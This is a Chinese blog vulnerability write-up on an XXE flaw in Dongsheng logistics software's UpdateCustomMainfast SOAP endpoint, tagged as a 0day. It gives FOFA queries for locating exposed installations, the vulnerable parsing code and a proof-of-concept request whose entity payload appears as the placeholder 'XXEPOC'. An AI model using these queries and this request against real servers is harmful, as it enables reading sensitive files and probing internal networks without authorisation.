---
title: "东胜物流软件 UpdateCustomMainfast XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html
asset_dir: embedded-base64
---

# 东胜物流软件 UpdateCustomMainfast XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/28 00:08
- 719浏览
- [2评论](#comment)
- 23分钟阅读

深入探索

安全研究工具

Windows安全工具

物流软件安全

---

# 漏洞简介

东胜物流[软件](#)是一款广泛应用于物流行业的信息管理系统，主要用于货物运输、仓储管理以及供应链协同等场景，帮助企业实现物流业务的高效运作。该软件的 `UpdateCustomMainfast` 接口存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE "XXE")）漏洞，攻击者可以通过构造恶意的 XML 输入数据，触发该接口解析外部实体，从而读取服务器上的敏感文件或发起内部网络请求。成功利用该漏洞可能导致敏感信息泄露、系统配置暴露，甚至在特定环境下实现进一步的权限提升或系统控制，严重威胁企业数据安全和业务连续性。

软件

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

漏洞扫描服务

Web安全书籍

VPN服务

直接看 `UpdateCustomMainfast` 的实现逻辑

```
  public string UpdateCustomMainfast(
    string Xdoc,
    string XdocAfter,
    string Corpid,
    string SenderOp,
    string SenderHandphone,
    string SenderEmail,
    string SenderFax,
    string Mblno)
  {
    try
    {
      bool AfterDoc = false;
      string filename = Mblno;
      string str1 = filename + "_";
      string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
      string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
      string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
      string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(Xdoc);
```

深入探索

编程语言教程

技术文章订阅

Web安全课程

参数 `Xdoc` 无任何过滤或校验，直接使用 `XmlDocument` 进行解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")漏洞，朴实无华。

漏洞预警服务

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXEPOC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

![东胜物流软件 UpdateCustomMainfast XXE漏洞](data:image/webp;base64,UklGRioaAABXRUJQVlA4IB4aAABQSwCdASrKAVYAAAAAJaW7hdgERGF5j9fZr4Tq2E+36M9tN+4HqA/V79gPd99O/+i827riv0g9gD9Uett/uH/c9LLVc/Bf8M/Az9PfFD+dfht+uvrP+DfD/yP8KP1u/u/sZ92jbl+M3uX/Cvo18j/qv6Xf1j/K/3/35/m/4u/rd/SfZngBfhP8K/lX4d/sz/g/aB/VfyA8PHIvoA+AL0p+O/0f+zfqp/Xv9n/pfYc/NvxV9zfp5/Y/cA/g/8S/nX9f/VX+yfCX9V/zPiw+L/zn8bvoA/jH8k/rH9m/X3+8f9X7Ov0n+9/3n/Bf2z+8f+j3U/kv9W/uX+C/Y7++f9P8Av4j/HP6X/Zf7//ef7T/4/859rHra/YD2If03+f9PUGTxptExptExptExptExlvlgMBi5GMZ8oJVTtFMKyd1OZ5cEFvoKDTGmJ5o2/qQhmUfH5YNQUFAaMP4TP3CbxA3ySY/OxyTRZydfBEBl+xqTH9rJNYK7graIA9xrnQB6MYrvu4rFAJgVdtLUr+MiUp8aeOfQlX0jqpCpOofvpcoCQNEZ4SnpP1YNjLn5BijEjNUc26HwexeGRmseTNtz7wT+u8I//UI2KDBdUd8JsTRTPRdI45G4Py294Lc61/m45fjUxhPR4uoTaR//VJ/7/B22I6DTdp0gdsAs5xZhO7OopNtnjeQdTJeyQ41/dXV20UD0LdczgTvYMpJfabS8qBx+nJNACNEEluEUDXhK4tFs83e5M4LsiyR8yk8eX/LB7c2LnQormkDYhomNNomNNomNNomNNomNNomNNomNNomNNolQAD+//3FngAKn9pVIlcErvjgw1WvCKmzBJvUypYhHtPHMsOd+k+wtC45gsq22qYvU6sj7OPbn8FEAYPFDX4YhtPer2RENyuFqFj3FD1qAIkP6HJihzM3sWRAvgiT2UssBy8Niakxni0DOU3hsm4xlFV28zux5Lgfd1xklWWcNY48ju3t2fl8mgv13fQAFqgKwcjuOhyKNjUT2mNvQ3GzLsDrshZpmrne7S38btJiVLkf6v+JP/6UA1aSkesz9sQkEB+PYyzd7gY7wft84/dk5RpiJpH07IANjCgsX2iVCFK1D6Nrw2jbJoIw8TV8/KAxnwF9BCdo07qkMlEYtc+oG+Y9PSEC6owlZs+/6I+3RzmV6mYBCvSz+5mV2oheUMjL+1mX+df4Dbn73aTaJJeN2C4QCXU7tmWI3iaVizdJw4SZhNmKJMTLVnQsNwoU90QeJXrb6kIrOf6XiBz2xutYE4k4JKh7E9N3qoE1U/VU1HcQOOqFuT/Cq2ZmsX3NOjVt2ETUIjs49JjA0/MjaYGEiJ2plDeH/+KoVGljEGjWMs+iEn/Ki6NkAvzb+PGXT7kv4IM6Pu++2XyzjxSlWJseTD6faXVbrtCzXGaVRFKmIpeI0vWEe55liDaH0f7ft1v+9Koa6pAg24tgTK/mi/07m275MJ6WCmv4ao/PLQkimCOKbcoQokg+kHIvzRzOLugynpkdIXhcjvO8lkB2xHMhKzT+7x64QfFYuvNlyzEj3jfNmMzWL5wZ3ozj+4Ug/rDsi6ShGyhthLtye0akg/H+j///3PBvNyg5rNufNb/fnkdDgsYg0axln0Qk/5Zn21JegVx1f3ELrYpniuFxAOyXv0U6XygiTnIHbRSr2taT1XTb8wg9Jqg0FzrQjHbnJq24ec4eSEv8ADBJqvfpCsNdAbek25OcT/S+6ofZMypo/x4ibZ8hMOy+xD8H9B+kJrCqdHRDkzEc2Zs3QJscuJrpctALQaNUR8CmJNGI1dizuC1p+HrLyn9MaJ2d4qtf/GVl1gvrAx3n/6EduP2aqfByf7XBVlj4ydZsWaLR9RFWvAnfdSDsLoXTR0HFBYX3eEcfY+weo3Pu0EAD/G6FF1uKgb9PAW+VA4UmmdjZyfs1XB7PTjZ6/hf8hMQw1YEew+4Xratbb/hkUYanPzym5Ci/6JV4O4qxaUxglb5K9+vuyf1uSpG2p63kxk60/Is25WXc0dUncRoZjBDWfhfLvfdXJh7X69ra1j5+FmMJjppQxnnI0eV0JjwXE992OW8Y2yTDYtHckf1voYxa8C0pSYqxLhvS6c9b6e/LaAf+0/L7YDunijkkjM34oqFTH31sGMtUqmzSq/ilpz4ySwNpMkajhSaZ2NnJ+zVcHs9ONnr+F/yExDDVgR7D7hetTcidXV4wgjsA+nnjKMyVWUDpvbu8W2wPW+Svfr7sn9bkqRtqet5MZ8mo3hixsx4754EMq8MooqGYBn/HRWFhZQMVQG4fqWXzEFSLfTfNhhgdjkT49muk/MuUk/rX7YweoH/K30CpmktXXZcqUbNSttwFbljiVDbfVtsY2vmYJ7SPbiLTr7u499Rsh8kuy/FnTGLq/+5tZF1JXBUGhpFsikTHbOOW2Dev5Ntv4v90wgeNp/aa0gUtkkQ5foihz/Mop8NDD5HpC3SvFjJ7WtuAczTf9NjG9TYqL2b2xKNp1kjmzgxscL5lLpKskvAsVuXrymJpQl6JjeK/prgBB5nkF21FTq0wtTl6mulRkPmO/y8Qsv7Nt5rayWYyUf+qBj6cktdeUZcmAuqJMf7Bzx+gCFmLH/prq4wIBm4KSMdgypY+f8GDOvnGt/oSPOeOcr0K7B1LxR9nhDJpUbgG6cyxBpCuPZgTbHkj6dT/C5nJ5djsyIxs2OFW5xNwpGDgh5wI8k/VfMGH6OibMxWlOfyumXIXl3tbxvMTPH/tizQlbIRY3p5A4UqsqQHnoRhGFLhbbDZEEMQqXis3IUUzBXz6rZ38/nRv95WCYHlO2y1vjegjAEoD0MQyY41woaof4YA9WCHhnQwAeAEtHKM3VF8jDss0cjhsVIkAChx42sMFjZ+6XmlKylogPX9v5O0NpBOOdCmEYDtwGv1qiwTsIc8fOCB6EkABzpTKMLYJ/C71Yvklt4ODpRRlhQEivr7tGzP/bmyNyZiXX2uLl/vTJKQYtkteK3Sfv6W30OUow5EQeQWw8LBjqHGBvietAbmG4mjjn/zup1EugUhP9xuOD2N5F9vCE3kiqzErkEi8z7ERTJG8/4LkBpOuU3kxyjOW/xK0EdJthldL0Hy+9BwFucg2IwcKkCHtDGwqgAixQ8nHpAL7UXEn2oHsfzg/g3O9deYkMs/cJ2TfjYwHq/wkiQekw5ehlPO09DnKDQt4kgbfaLWjki/tkpYOGpW2GhwFJzXaxEy1Yo4wm793rVS6gLHHVyz9RsBmcEtxFSFDEx8O7knubdQcSbVqHEnqS1e1vlFK/1y+BlvCnEVNLhy5vMRP/0DBozyi3rz2cQR8yPpG3sk7NubLIYXnFXjqjL1mAETu0G2JdPCfyJTLFXZjBN4KdsUqlNxrxGtsiVSjtqvLi+jWRA3/Qb3vFQC/dP3BxbNSP3yhTgSNx+uvrCAo/+GiQ4YY/dN8gCHl1fS7T+lMOlPVzQvpz56db+e0FwBI4+5FpP5Zmu5NJ1//fWy/96QOQcudyfB4MHe78R71TBbTeeZyPvf4oi4vLixoHoMtby46iUAS/13C5rnJN+LklnCT/M90luO+G98eDFwowJg9sfuhmVbnJMgHohDvMmuUehVLciWxksiGBfotHGDQfa603VMPf7/orOPUX+rrENKDEvM8RRYsSQjJIIbAF+sqX+oAWjFJZeVLU9dsVejY/x2cbfx6UY/zsMsPFg23QD9cscPM8sVaOaPvz/9eZ+2jB5sBlGBXblKEudB/FcgLjmW8oOACUS54UTo/h0vEt2VsuZ8F1a4A7gjLYPPmoZT5KuI4j2npD8aJnHFBU8gi+xBLTmrVHCnM0YqxuJ0NqgLkwrykhQZfPfJyPLK9LlkWvSzRJo7yl0pevKC5Ud3ZXRLldcxFoaJaUmYJij2yPKly3lDeTqr7v4fAqCt6cXODwXam0WHnFjmEgMV1aW++GQ5MS+074ktKT8R8CpOD6qJ8vyRcxZtdOSTDIv0Bsh+1M1kwJg+trQiRXi32pbi/2YGnxWxTDEdXDv31Z+fcaf9LVl2TmBFrkeH2g4gyWqHP4rTUa4TJlsqkE9e9Pcqqj5Z16PYkSxHFsWs0I4tUxOF5C5p7jSU/KT+0CIjqxgxj8i0X4oGkR+xcc0drYo4Q5EbskrianfG52/Q7HDN6ZIfxlVZLYMQqk+7q6F72PdNLYkwIC4n5E1DSE7ehUX3hm3o3qXlfP2H4MdlChhbsw9Xq2ypDq/7ilhD7+Ki2sYR5+MlZP9Z4jn5fUD/8joi30ki7iEncFxwoE/YcCkfLW03xxc4UqWcVcKNMobqM6vZn+fv0vmJa1imRPDAqAg4kNOnAfxIna3sipKhQ2T+8xTb2sD/PFn920ZQ7POffBSX4GP2ZXHL0NoAgmTtobNpP1x6IBmy9RuoBo8b1vZxOB+IuE8yp26b0zV15N1P7vmaKmRqcYQw/PKQzD2910RmJ3AvvoBIJc2tN57RZ+NQ5P9F3sT9CBKrIhL4gBbmVB2FI+g6yeGKM8z/ag62NpWZym+f+tcrR8pOa/IdVNc3o9uzD2Ordo4fPLG5OEw7ZQFwSSLYt91WThUlHeRWKBeAbPdDZk0zbriJfoPSeGxUJRQXBLeswMn11LnrETyPzB4jLtTYWGx/T1v4uNxbwXUjg71dK6kPaJn7GuXy6awGnXvy3LGV6mPTfw/yBVeD8HbJdwPvV2HqkdQ0QuP+vr1tvCFQrR+FmuudxTFp7QkCCK5RuZTKv37HgttHEzbEoojrATHY//oc42u/uvcLzWXcsXSaH0okwsORtvSWKPlGPJWf4xBTc5tuOBCs33PAHmxHjwamhvRGASpUhhPgtlaslqAhXT6Mz1T9Ftg1EMuYiMmGT533du4mqJZmPhbcqowXnWzI30rrm/PSQ9GefnHu7ejPghIjHCWt1StlrlA/+cJch2ANV8cfO6MNn0JyVrLdaCqbu1O4wFt34vMXr9zTtrNsqd0pTUAZBV1ulBjDsHe1bsRi5x3QppmDfQ27aTbiEBTnDLXM88qN5qj+v0f1a8U2azAgbcD7QBRXZ+TIzq1K3Tl9PVqLpkPjsqMEBtp3p6eq0+aKh9Qi9M4byWsyww4aCtuKDF5a3joLmHJZ4qLmPwK91SH3Fmxq3Je0uWDpPDwSBgULuYQpLSEnwunHR3NhrIjQF6EiUF1BBpjFjvG85h3QG3AGphGGj7T4TeBfvMesieVhw1ZDy9MM/hVT1AcizWuYaF/NCxd/b7R2zSvWHgA2Ot+lq0/HOUCqEYWipgIE4KDlGrA/d3QuCnfoh1ecYaEnMLqOypWD/4ZjZ6x79RQrhZ/i0elIkHe8YT0c82wk8OQcAd1j333vi6BjgkoxHirAp/KilaFFTZfyMrAQUcvdxn4tsiO5BeTiqC0oRG4XW42EV6nPCwFRQjtDCiRSPtm0BOJ+VL2MZRhtZBaU7mQvHCQIAhlz9Q4uLLKtHpNOqy1Gd9g59i9o36yDO6ExUaZuFYKnHTaFI6X0SkBL8JJyUwxkzV1ZGGg3a1fVHuuAjtfbzRW+slq1FF2CMiEqmF0Mwc2aXZbs107K+L5EtrkFzsBNYFgqAmJvFIahMbBSjCXJF0TDjcErXqMff7B/m6T7ygx8zlYdZbpXAZCnV1fHmTjqsPZiYdvbVpJpOeN/2pMY4+dvHI0iAxmk9iAgbYhr4O6ULF7d0kMQMHTTs22zSirpIcxaepgxRyPg77hYuNK+i4i/a+coKjyaKV/0Ky/6uIUmApExNM3h1rLfbSNK14dSqLvM6ZbhK+mMSeOecgbW6teXxsgClIGmr5lt3Y4iLNSoYJua0A/mKMbuIVNSz04bXENrXoyu0B8SMXnjAzz2mCa3aIMqn3RrU5Dq0PSVrfMPiWOy+pUIcqD2lOC+rRFDJT3jiMABsRBRm+r5egLO824ffBMJPMeTb6IVj6szF4eMcPkrOQcpzxCX3H5JgZQTlf5PLnt/UmME5oZHZMqypQdTMAkBUnDoHhz6E3CID4VtG2rojNetLQLW9MREWI2KX1j01v2RKpK1SDxTsc53A12JGEjBxowkY9dFh83vvRNdL5V9dsX+B85T3uis+H12+NIAcNYFm5DlFkZ98IGjneP52jXKF10RTw+kzKgEpZxNuwO11kagp2wGkSKZW92+2PMbJEo1xkw4CxsQjpT8UceuzYdcJjj3xHzwPbQeloWv169Ut8hbiWjjiiEKMMba41tCuuHl7Q7PMJMmhFgLfV6Yt2zljlrwCF2lY/7YqvoKRT8pQz0rbzA8Ndg88ExU+rTG2/xI3aH4FH8jTK/QOfUe5clZTlQu+gzdnl+lunVyT8sgyPt85agh5mSiIKjVqNAA2lVnktHAayRCP3lHDSuvHudPeud6NuRTMA6EjESrV9tuwZT+nTcqaGm5zxphAhSEpDzL3XIB2KoPVMtBnMi+6wOenetbvGkrMj5W8KRIqpWwhurjX8qS+/6h9Wa1/NuQtk/GcaoMQ/c2XrrSOfvnl2XfRiqICajQKfs+BW3zHul/ARCIqIS5dyGsFt/2n+QgYeT2rhayvw4yTHOdTx6kp7a20HEHI5ltg/HpSd6qkBxOyDtQ9N8C7IVvu3LdMRVn2OPjipzrpzrwNKJC5vZtCoXBMMmiJg5E5g9bCv/ldaQR46l8dOdBjD6mQS18nXX/oeuzidBHon3PN3mFJ3PXYWlkgfSNrgzlIcOrLilvYHni77tgOg8vRD5/JqOWOdiQYyluuHF+hxwZoCpl7x02lT2jm+Uvr+4vnR0x3S7tpbKeVxYTngxgZmmXHr3q1QGwUJa41+0A5Y309kjD4rlDwJBdFIJt8ki1udQG5teAaVR5AJVa4ziE+GDjmkpvN5He5VhHtdOTfMC03ihB54zf+kqPTee8cd+QDLS98DgAE+N7po/x/3TeS74uJcudoibyttI5S7wOc8h4cT7D5ZYi+IHFel3Hdei5hsifZismrrBlGqZL0+k2sXd7rs8ZPl3XlVd4p50zoqCeEGUhdYl36VV5HYbSqObIjJjcOK5l2cS8Td512OBYxvWMwmtIAWwciOFQ3e5ESxgYPTE+/My7GLljMU1TmKuF7O5rKq8jsNpVHNkRkxuHFcy7OJeJu867HAsY3rGYTWkALYORHBI5E9o4hI+/uc0vhmKsE6DQmYatuYLUbZRTgqnTjwHoNhrrrNq6FYiLo7DbD54osHWT5JvKj01FWiwzPLJ6EoqrMg0fQSHDYlZgfA49UIpysOPK4gTRyvxbOmkDSDr+8njzqczFw+g219/7+bg+kW7DVKyochzqNaz97e3XJai34SrjN02PClDH0D5o1skj3YFryK2JgSG8txcmFO4Hxtqr7R0Mgd4padyye2Na32h+HuyvZ9T4BcdfgPGcKcmZjAwiM0vqUq5GxzAqUFbBFm2u3h06FsOduBAGBYt+FTd97tHv2pqzyDP7y/444YO8o6DTLOc946/UGqmudpmadVO+vQCuow4ZWNJg0wvq4QxeDQYNtJBgHEswT3r1Q/YTpceLye64kQqVflrRAsVLs4ZwNrc1JGItXS6UuPvOF1oyn6SN8BXnqqVygXAYfhlM5rBKHB5/9y4Ev5TtQO1/0itXy4VUnID35qpqS8obf8WyHOnqB7S+XAtlYmMF29+qyibO1/2h04mL6md/PYXucszA98vkB0vkCDgTdF1x95BWQvDrznnCuSATtmCGr8AeAdKpoO/ybxuhVBWL1hjPP1KaR4wcFjxCWyKQiF/3xXnqBmOoeuUGXlII8TSHFY5MBkrDoDqyzSQdGlQSAOHsH03Wpx/kSkWpvtTD650c+m6RdxsrLal6HMBC7xQLXs709R6QnsG1lXUlt4F/dsDhgHvzdXU9g/EdSxKGY+kRjcw8CRkcpKYbgPoXRRldYu2qjZ1uOla3ZRzNvaoXXEpDHPTg0yHey5mZkzshYyhrgKTSOKPG9IrWxnGb6vSV1FVr6THYg7GeJN15eV6mP74pX0cPiDIIEb/u3cWAZWNyMoxI9GT+dH+3jzpgGgFJ4z3/r++Hze6mEZNRQHffw7oioFma+nT3+e5Pjk+WqFbgMmOshLlDH2fU2LABKII+S3MdZoiXbYmsIK2hbYco/FSuYLV+PMYG/3ciMo9A6MXCjtUFeq1UCDXz3B9JwFdvHOoMuNzYZCcQmiwxUDsHvz6eW7cnZp5L4cnDl3SsCgvpKYTiKQnzD+FdOfQIAgYxfmEGDWmXxSJhLFmmFDeRVUOrcnL3l8TylyQeSxJS9pez6Wn3J8Uiw1ozq+DXRmfCqsLj53BKDdk1KiHv2ArAUKlmPxe6FkT7y3puFM0xt7arX+D6KB4hqGKwtvatgGq+P6tDGctYeFy1Bx+LSm55vJ1hC61SUTCQ+fJUbjEZYRflNwXC81C1lLWsUTUvt6JP+YPmxulCaONKgvnLWq6u4I9VJIfx+MPdKzycOXM+YqtQCjNH6vvE3tx4vTiVqIMuy6WaMJLU+V2NZNPTpe69Rv1VkJx1kvaYzW54ABWL9ZvJsfJf/xP5w/otIb7+yPK9mhAmiJinWOqwxwmfYQ9Cr1RUQM+WhFtXEmbyt8/UlgLaPtJDqxHsgiXOSjUlvWGab0smW0U2gjuTGRAsHAoWXw5Of90sFA4YQQV5P1HovLDLcL+pHyqAkaGx3o4AUneZlMRDfnpaD41ervNgDmSOYmB1eV3LyPg34QLUAgA6D2UsSfYJhC1TrCWxoMAJ0xLKEAkimbTxXJY9nW3Jwv4pbAaP+ikY7R7FnaejL9vlt2Y1LQquX6EUIxLbBgbBMteKLOPzuhvm2txKrd4aoe4IOrwmGCPGBJE2kAwnqGnaO1k+6tAJ775a4hx9BBOnQb9iE1MfyHOBFh07ymXGLW65zYaxzV9K/RnaoJ0KZgAAAAAAAAA==)

成功在DNSLOG平台收到DNS和HTTP请求。

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
